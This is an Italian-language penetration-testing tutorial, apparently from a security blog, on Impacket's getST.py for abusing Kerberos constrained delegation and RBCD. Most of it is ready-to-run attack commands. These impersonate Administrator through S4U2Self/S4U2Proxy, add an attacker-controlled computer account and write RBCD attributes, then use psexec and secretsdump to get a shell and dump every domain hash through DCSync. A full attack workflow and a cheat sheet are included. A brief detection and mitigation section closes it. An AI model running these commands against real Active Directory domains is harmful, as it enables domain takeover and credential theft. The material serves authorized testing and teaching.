---
title: 'getST.py Impacket: S4U, RBCD e Constrained Delegation'
slug: getst
description: >-
  Guida a getST.py di Impacket per ottenere Service Ticket Kerberos con
  S4U2Self, S4U2Proxy, RBCD e constrained delegation. Payload ed errori per
  pentest per AD
image: /getst-py-service-ticket-s4u-delegation-abuse.webp
draft: false
date: 2026-07-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - constrained-delegation
  - delegation-abuse
  - kerberos-delegation
  - ccache
  - s4u2self
  - s4u2proxy
---

# getST.py: Service Ticket, S4U e Abusi della Kerberos Delegation

`getST.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) e richiede un Service Ticket Kerberos, salvandolo come file `.ccache`. Nel caso base ti serve solo per ottenere un ticket verso un servizio con le tue credenziali. Quando invece controlli un account configurato per Constrained Delegation o autorizzato tramite RBCD, `getST.py` può richiedere un Service Ticket **per conto di un altro utente** verso uno specifico servizio, sfruttando S4U2Self e S4U2Proxy — senza conoscere la password dell'utente impersonato, ma solo se quei prerequisiti di delega esistono davvero.

Riferimento ufficiale: [fortra/impacket — getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)

## TGT, TGS e Service Ticket — chi è chi

`getST.py` produce sempre un **Service Ticket** (detto anche TGS), l'ultimo passaggio del flusso [Kerberos](https://hackita.it/articoli/kerberos/). Se non hai chiaro cosa distingue un [TGT da un Service Ticket](https://hackita.it/articoli/tgt-kerberos/), il riassunto è: il TGT è il ticket che ottieni al login e usi per chiedere altri ticket al KDC; il Service Ticket è quello specifico per un singolo servizio (CIFS, LDAP, HOST...), ed è quello che ti serve per autenticarti concretamente a una risorsa.

## S4U2Self e S4U2Proxy

Per capire getST.py devi capire i due meccanismi di estensione Kerberos che sfrutta (documentati in [MS-SFU](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)):

**S4U2Self (Service for User to Self):** permette a un **service principal** di chiedere al KDC un Service Ticket verso il proprio servizio, per conto di un altro utente ([MS-SFU §3.2.5.1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)). Nella constrained delegation classica, il flag `TrustedToAuthForDelegation` abilita il cosiddetto **protocol transition**, che permette di ottenere un ticket forwardable tramite S4U2Self per qualsiasi utente — anche uno che non si è mai autenticato al servizio.

**S4U2Proxy (Service for User to Proxy):** permette all'account di presentare quel ticket (ottenuto via S4U2Self, o fornito come evidence ticket) al KDC e scambiarlo con un ST verso un **servizio diverso**, tra quelli configurati in `msDS-AllowedToDelegateTo` (Constrained Delegation) oppure `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD). Nel flusso RBCD, [Microsoft conferma](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview) che il KDC gestisce il protocol transition come se il relativo flag fosse già abilitato sulla risorsa target, anche senza `TrustedToAuthForDelegation` sull'account delegante.

```
[getST con -impersonate]
     │
     ├─ S4U2Self → ST "Administrator → svc_web"  (forwardable)
     │
     └─ S4U2Proxy → ST "Administrator → CIFS/DC01" (usabile)
```

## Matrice degli scenari di delegation

| Scenario                    | Configurazione richiesta                                  | Ticket di partenza                                     | Opzioni getST.py                       |
| --------------------------- | --------------------------------------------------------- | ------------------------------------------------------ | -------------------------------------- |
| ST normale                  | Nessuna delegation                                        | TGT dell'account                                       | `-spn`                                 |
| KCD con protocol transition | `TrustedToAuthForDelegation` + `msDS-AllowedToDelegateTo` | TGT del service account                                | `-impersonate -spn`                    |
| KCD Kerberos-only           | `msDS-AllowedToDelegateTo`, senza protocol transition     | ST forwardable dell'utente verso il servizio front-end | `-additional-ticket -impersonate -spn` |
| RBCD                        | `msDS-AllowedToActOnBehalfOfOtherIdentity` sul target     | TGT dell'account controllato                           | `-impersonate -spn`                    |
| Solo S4U2Self               | Account con SPN e credenziali utilizzabili                | TGT del service account                                | `-self -impersonate`                   |
| S4U2Self + U2U              | Scenario specifico                                        | TGT                                                    | `-self -u2u -impersonate`              |
| dMSA                        | Windows Server 2025+                                      | TGT                                                    | `-dmsa -self -impersonate`             |

## Sintassi e opzioni

```bash
impacket-getST [opzioni] dominio/account[:password|$]
```

| Opzione                            | Descrizione                                                                                                             |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `-spn SPN`                         | SPN del servizio target — obbligatorio tranne quando usi `-self`                                                        |
| `-impersonate UTENTE`              | Utente da impersonare via S4U                                                                                           |
| `-altservice SPN`                  | Sostituisce l'sname (SPN) nel ticket già ottenuto                                                                       |
| `-self`                            | Solo S4U2Self, senza S4U2Proxy                                                                                          |
| `-additional-ticket ticket.ccache` | Usa un ST forwardable come evidence ticket al posto di generarlo via S4U2Self — necessario per RBCD + KCD Kerberos-only |
| `-dmsa`                            | Richiede le chiavi di un Delegated Managed Service Account (Windows Server 2025+)                                       |
| `-u2u`                             | Richiesta User-to-User — funziona solo combinata con `-self` o `-impersonate`, non da sola                              |
| `-renew`                           | Rinnova il TGT usato per l'autenticazione (richiede `-spn krbtgt/DOMINIO.FQDN`)                                         |
| `-force-forwardable`               | Forza il ticket S4U2Self a essere forwardable — opzione avanzata, vedi sotto                                            |
| `-hashes LM:NT`                    | Pass-the-Hash                                                                                                           |
| `-aesKey KEY`                      | Chiave AES dell'account (128 o 256 bit)                                                                                 |
| `-k`                               | Usa il TGT dal ccache corrente (KRB5CCNAME)                                                                             |
| `-no-pass`                         | Con `-k`, non chiede la password                                                                                        |
| `-dc-ip IP`                        | IP del Domain Controller                                                                                                |
| `-debug`                           | Output verboso                                                                                                          |

## Scenario 0 — Richiesta standard di un Service Ticket

È la funzione primaria del tool, senza nessuna impersonation: password, hash, chiave AES o TGT nel ccache → richiesta TGS → salvataggio in `.ccache`.

```bash
# Con password
impacket-getST -dc-ip 10.10.10.5 -spn cifs/DC01.corp.local corp.local/user:Password123

# Con NT hash
impacket-getST -dc-ip 10.10.10.5 -spn cifs/DC01.corp.local -hashes :NThash corp.local/user

# Da un TGT già presente nel ccache
export KRB5CCNAME=user.ccache
impacket-getST -k -no-pass -dc-ip 10.10.10.5 -spn cifs/DC01.corp.local corp.local/user
```

## Scenario 1 — Constrained Delegation con protocol transition

**Prerequisito:** hai le credenziali di un account con `TrustedToAuthForDelegation` abilitato e `msDS-AllowedToDelegateTo` configurato. Lo trovi con [BloodHound](https://hackita.it/articoli/bloodhound/) (edge "Allowed to Delegate") o con PowerView/ldapsearch.

```bash
# Enumerazione: trova account con constrained delegation
Get-DomainUser -TrustedToAuth | Select SamAccountName, msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth | Select DnsHostName, msDS-AllowedToDelegateTo

# getST — S4U2Self + S4U2Proxy, impersona Administrator su CIFS/DC01
impacket-getST -dc-ip 10.10.10.5 \
  -spn cifs/DC01.corp.local \
  -impersonate Administrator \
  corp.local/svc_web:Password123

# Con NT hash invece di password
impacket-getST -dc-ip 10.10.10.5 \
  -spn cifs/DC01.corp.local \
  -impersonate Administrator \
  -hashes :NThash \
  corp.local/svc_web

# Con chiave AES256 — utile quando l'account supporta AES e non hai la password in chiaro
impacket-getST -dc-ip 10.10.10.5 \
  -spn cifs/DC01.corp.local \
  -impersonate Administrator \
  -aesKey AES256keyQUI \
  corp.local/svc_web

# Usa il ticket ottenuto
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@DC01.corp.local
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

## Scenario 2 — KCD Kerberos-only con `-additional-ticket`

Quando il service account ha constrained delegation configurata ma **senza** protocol transition (modalità "Use Kerberos only" in AD), non puoi generare direttamente un S4U2Self forwardable per un utente arbitrario. Devi invece possedere un Service Ticket forwardable **realmente ottenuto dall'utente** verso il servizio front-end, e fornirlo come evidence ticket:

```bash
impacket-getST -dc-ip 10.10.10.5 \
  -additional-ticket Administrator@http-WEB01.corp.local.ccache \
  -spn cifs/FILE01.corp.local \
  -impersonate Administrator \
  corp.local/svc_web:Password123
```

Il ticket passato con `-additional-ticket` deve essere coerente con il servizio front-end e realmente utilizzabile come evidence ticket — non un ticket qualsiasi.

## Scenario 3 — RBCD (Resource-Based Constrained Delegation)

**Prerequisito:** hai scritto `msDS-AllowedToActOnBehalfOfOtherIdentity` su un computer object, tipicamente dopo aver sfruttato GenericWrite o GenericAll su un computer account. L'attacco RBCD completo è in [RBCD](https://hackita.it/articoli/rbcd/).

```bash
# Step 1 — Crea un computer account controllato (se non ne hai già uno)
impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'AttPass123!' \
  -dc-ip 10.10.10.5 corp.local/lowpriv:pass

# Step 2 — Configura RBCD con rbcd.py: ATTACKER$ diventa trusted per delegare su TARGET$
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
  -action write -dc-ip 10.10.10.5 corp.local/lowpriv:Password123

# Verifica la configurazione
impacket-rbcd -delegate-to 'TARGET$' -action read -dc-ip 10.10.10.5 corp.local/lowpriv:Password123

# Step 3 — getST con S4U2Self + S4U2Proxy via RBCD
impacket-getST -dc-ip 10.10.10.5 \
  -spn cifs/TARGET.corp.local \
  -impersonate Administrator \
  corp.local/'ATTACKER$':AttPass123!

# Step 4 — Usa il ticket
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@TARGET.corp.local
impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
```

`rbcd.py` gestisce direttamente `msDS-AllowedToActOnBehalfOfOtherIdentity` con quattro azioni: `read`, `write`, `remove`, `flush`. In alternativa puoi configurare lo stesso attributo con [bloodyAD](https://hackita.it/articoli/bloodyad/) o PowerView.

## Usare un TGT ottenuto tramite Shadow Credentials

**Prerequisito:** hai scritto `msDS-KeyCredentialLink` su un account ([Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)) e ottenuto il certificato `.pfx`.

`getST.py` **non supporta** un flag `-pfx-file` — non esiste nel tool. Il certificato va prima convertito in TGT tramite PKINIT (con [Certipy](https://hackita.it/articoli/certipy/)), e solo dopo passi il ccache risultante a getST:

```bash
# Ottieni il TGT tramite PKINIT usando il certificato da Shadow Credentials
certipy auth -pfx target.pfx -dc-ip 10.10.10.5

# Usa il TGT generato
export KRB5CCNAME=target.ccache

# Richiedi uno ST come l'account del certificato
impacket-getST -k -no-pass -dc-ip 10.10.10.5 -spn cifs/DC01.corp.local corp.local/target
```

Shadow Credentials **non ti dà automaticamente l'impersonation di Administrator** — ottieni l'identità dell'account associato al certificato. Puoi poi usare `-impersonate Administrator` solo se quell'account ha anche una configurazione di delegation sfruttabile (torna allo Scenario 1 o 3).

## Scenario 4 — `-self` (S4U2Self standalone)

Solo S4U2Self senza S4U2Proxy: ottieni uno ST del servizio verso se stesso, impersonando un utente. Utile per casi di delegation parziale o quando ti serve solo il primo passaggio.

```bash
impacket-getST -dc-ip 10.10.10.5 \
  -self \
  -impersonate Administrator \
  -altservice cifs/target.corp.local \
  -k -no-pass \
  corp.local/machine$
```

## `-u2u` — S4U2Self + User-to-User

`-u2u` non permette di richiedere un normale ticket User-to-User da solo: nel codice attuale di getST.py funziona solo combinato con S4U (`-self` o `-impersonate`).

```bash
impacket-getST -dc-ip 10.10.10.5 \
  -self \
  -u2u \
  -impersonate Administrator \
  corp.local/service_account:Password123
```

## `-altservice` — Service Substitution

`-altservice` **non chiede al KDC un nuovo ticket** per un servizio arbitrario: modifica l'`sname` (il nome del servizio) già presente nel ticket ottenuto. Funziona solo quando il servizio sostitutivo può decifrare lo stesso ticket — in pratica quando i due SPN appartengono allo stesso account/computer.

```bash
# Delegation consentita solo verso HOST/DC01, ma il client finale (psexec) usa SMB
impacket-getST -dc-ip 10.10.10.5 \
  -spn host/DC01.corp.local \
  -altservice cifs/DC01.corp.local \
  -impersonate Administrator \
  corp.local/svc_web:Password123

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

`psexec.py` comunica inizialmente via SMB, quindi è `cifs/HOST` il ticket pertinente per lui — non il contrario. La service substitution non ti permette di spostare liberamente un ticket verso un host o account diverso: il servizio target deve poter decifrare quel ticket con la propria chiave.

## dMSA — Delegated Managed Service Accounts

Le versioni recenti di getST.py supportano `-dmsa` per richiedere le chiavi correnti e precedenti di un [Delegated Managed Service Account](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa), funzionalità introdotta con **Windows Server 2025** — richiede un ambiente compatibile, non è un altro nome per la constrained delegation classica.

```bash
impacket-getST -k -no-pass \
  -self \
  -dmsa \
  -impersonate 'dmsa$' \
  corp.local/user
```

Il tool stampa le chiavi correnti e precedenti del dMSA, utilizzabili per impersonare l'account che il dMSA sostituisce.

## `-renew` — Rinnovo del TGT

Funzione secondaria: imposta l'opzione Kerberos `RENEW` per rinnovare il TGT usato per l'autenticazione. Va usato con `-spn` impostato su `krbtgt/DOMINIO.FQDN`:

```bash
export KRB5CCNAME=user.ccache
impacket-getST -k -no-pass -renew -spn krbtgt/CORP.LOCAL corp.local/user
```

## Quale SPN scegliere

Il ticket richiesto deve corrispondere al protocollo che userai dopo — non basta "un ticket per il computer": uno [SPN identifica una specifica istanza di servizio](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) e la associa all'account che possiede la chiave usata per cifrarlo, quindi la service class deve combaciare con quello che il client si aspetta.

| SPN                   | Servizio              | Uso comune                              |
| --------------------- | --------------------- | --------------------------------------- |
| `cifs/HOST`           | SMB                   | `psexec`, `secretsdump`, accesso share  |
| `ldap/DC`             | LDAP                  | Query e modifiche LDAP, DCSync          |
| `HTTP/HOST`           | HTTP/WinRM            | Applicazioni web, alcuni workflow WinRM |
| `MSSQLSvc/HOST:PORTA` | SQL Server            | `mssqlclient.py`                        |
| `HOST/HOST`           | Servizi host generici | Alcuni protocolli RPC e servizi Windows |
| `RPCSS/HOST`          | DCOM Endpoint Mapper  | Workflow DCOM                           |
| `WSMAN/HOST`          | WS-Management         | WinRM, a seconda del client             |

## Workflow completo — da BloodHound a shell

```bash
# 1. BloodHound identifica: svc_sql è TrustedToAuth per cifs/DC01.corp.local
# 2. Dumpa l'hash di svc_sql (es. con Mimikatz o secretsdump su un host compromesso)

# 3. getST — impersona Administrator su CIFS/DC01
impacket-getST -dc-ip 10.10.10.5 \
  -spn cifs/DC01.corp.local \
  -impersonate Administrator \
  -hashes :NThashSvcSql \
  corp.local/svc_sql

# 4. Verifica ticket
export KRB5CCNAME=Administrator.ccache
klist

# 5. Accedi come Administrator
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local

# 6. DCSync — dump tutti gli hash (vedi [DCSync](https://hackita.it/articoli/dcsync/))
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
```

## Errori comuni

| Errore                        | Causa probabile                                                                        | Verifica                                                                         |
| ----------------------------- | -------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| `KDC_ERR_BADOPTION`           | Delegation non permessa, evidence ticket non valido/non forwardable                    | Controlla `msDS-AllowedToDelegateTo`, tipo di KCD e attributi AD                 |
| `KRB_AP_ERR_MODIFIED`         | Ticket cifrato con una chiave diversa da quella del servizio, SPN errato o duplicato   | Controlla `setspn -Q`, account proprietario dello SPN e service class richiesta  |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | L'account non ha permessi di constrained delegation, o l'utente impersonato non esiste | Verifica SPN con `setspn -Q` o BloodHound                                        |
| `KDC_ERR_ETYPE_NOSUPP`        | Cifratura non supportata                                                               | Prova con `-aesKey` invece di hash RC4, verifica `msDS-SupportedEncryptionTypes` |
| `KRB_AP_ERR_SKEW`             | Differenza di orario eccessiva col DC                                                  | Sincronizza l'orologio                                                           |
| `KDC_ERR_POLICY`              | Policy Kerberos, utente in Protected Users, o delegation non consentita                | Controlla i gruppi protetti e i flag dell'account                                |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Utente inesistente o realm errato                                                      | Verifica username e dominio                                                      |
| `KRB_AP_ERR_NOT_US`           | Ticket presentato al servizio sbagliato                                                | Controlla SPN e client finale                                                    |
| Errore su FQDN                | IP invece di nome                                                                      | Kerberos richiede FQDN, non IP                                                   |

`-force-forwardable` non è una soluzione generica per "ticket non forwardable": è un'opzione avanzata che usa la chiave dell'account specificato (idealmente hash o AES key) per forzare il flag forwardable sul ticket S4U2Self, legata alla tecnica di CVE-2020-17049. Permette di impersonare Protected Users e bypassare alcune restrizioni "Kerberos-only", ma il risultato dipende da patch e configurazione del KDC — non va presentata come workaround universale.

## Detection e mitigazioni

Cosa guarda chi ti monitora, in breve:

* **Richieste TGS anomale** negli eventi Kerberos (4769) — S4U2Self e S4U2Proxy generano pattern riconoscibili, specialmente quando l'utente impersonato è un account privilegiato che normalmente non si autentica da quell'host
* **Controllo di `msDS-AllowedToDelegateTo`** — audit periodico di quali account hanno permessi di delega configurati, spesso dimenticati dopo un progetto
* **Controllo di `msDS-AllowedToActOnBehalfOfOtherIdentity`** — stesso discorso per RBCD, specialmente su computer object creati di recente
* **Account marcati come sensibili** (`Account is sensitive and cannot be delegated`, gruppo Protected Users) — bloccano la delegation su utenti privilegiati indipendentemente dalla configurazione dell'account delegante
* **Rimozione di SPN e delegation non necessarie** — la mitigazione più semplice ed efficace resta non lasciare configurazioni di delega su account che non ne hanno bisogno

## Cheat Sheet

```bash
# Richiesta standard
impacket-getST -dc-ip DC_IP -spn cifs/TARGET.domain domain/user:pass

# Constrained Delegation (protocol transition)
impacket-getST -dc-ip DC_IP -spn cifs/TARGET.domain -impersonate Administrator \
  domain/svc_account:pass

# KCD Kerberos-only con evidence ticket
impacket-getST -dc-ip DC_IP -additional-ticket evidence.ccache -spn cifs/TARGET.domain \
  -impersonate Administrator domain/svc_account:pass

# RBCD
impacket-getST -dc-ip DC_IP -spn cifs/TARGET.domain -impersonate Administrator \
  domain/'ATTACKER$':AttPass123!

# Con NT hash
impacket-getST -dc-ip DC_IP -spn cifs/TARGET.domain -impersonate Administrator \
  -hashes :NThash domain/svc_account

# Con AES key
impacket-getST -dc-ip DC_IP -spn cifs/TARGET.domain -impersonate Administrator \
  -aesKey AES256key domain/svc_account

# Service substitution
impacket-getST -dc-ip DC_IP -spn host/TARGET.domain -altservice cifs/TARGET.domain \
  -impersonate Administrator domain/svc_account:pass

# S4U2Self standalone
impacket-getST -dc-ip DC_IP -self -impersonate Administrator \
  -altservice cifs/TARGET.domain -k -no-pass domain/machine$

# dMSA
impacket-getST -k -no-pass -self -dmsa -impersonate 'dmsa$' domain/user

# Rinnovo TGT
impacket-getST -k -no-pass -renew -spn krbtgt/DOMAIN.FQDN domain/user

# Configurare RBCD
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP domain/user:pass

# Usa ticket ottenuto
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain/Administrator@TARGET.domain
impacket-secretsdump -k -no-pass domain/Administrator@DC.domain
```

## Domande frequenti

**getST.py richiede sempre la constrained delegation?**
No. La funzione base (Scenario 0) richiede solo credenziali valide e un SPN — nessuna delegation necessaria. La delegation serve solo per gli scenari di impersonation con `-impersonate`.

**Differenza tra `-self` e `-impersonate`?**
`-impersonate` da solo fa S4U2Self + S4U2Proxy (ottieni un ticket usabile verso il servizio finale). `-self` limita l'operazione al solo S4U2Self, fermandosi al ticket verso il servizio impersonante stesso, senza proxy verso il target reale.

**Quando uso `-additional-ticket`?**
Solo quando il service account ha constrained delegation configurata in modalità "Kerberos only" (senza protocol transition). In quel caso non puoi generare un S4U2Self forwardable da zero: devi fornire un ST forwardable già ottenuto dall'utente verso il servizio front-end.

**Perché il ticket non è forwardable?**
Di solito perché il TGT di partenza non aveva il flag forwardable, o l'account non ha protocol transition abilitato. `-force-forwardable` può aggirare alcuni di questi casi ma richiede il materiale crittografico dell'account e non funziona sempre (vedi CVE-2020-17049).

**Come verifico il ticket ottenuto?**
`export KRB5CCNAME=file.ccache` seguito da `klist` — controlla principal, servizio e flag (in particolare `forwardable`).

## Articoli correlati

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Kerberos: architettura e flusso](https://hackita.it/articoli/kerberos/)
* [TGT Kerberos](https://hackita.it/articoli/tgt-kerberos/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [Certipy](https://hackita.it/articoli/certipy/)
* [DCSync](https://hackita.it/articoli/dcsync/)

> Uso esclusivo in ambienti autorizzati.
